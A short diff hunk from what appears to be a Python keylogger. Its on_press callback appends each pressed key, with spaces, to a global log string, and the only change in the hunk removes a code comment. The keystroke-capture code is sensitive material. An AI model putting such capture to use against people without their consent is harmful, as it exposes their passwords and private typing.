@@ -5,7 +5,7 @@ log = ""
 def on_press(key):
     global log
     try:
-        log += key.char  # For alphanumeric keys
+        log += key.char  
     except AttributeError:
         if key == keyboard.Key.space:
             log += " "  # Spaces between words
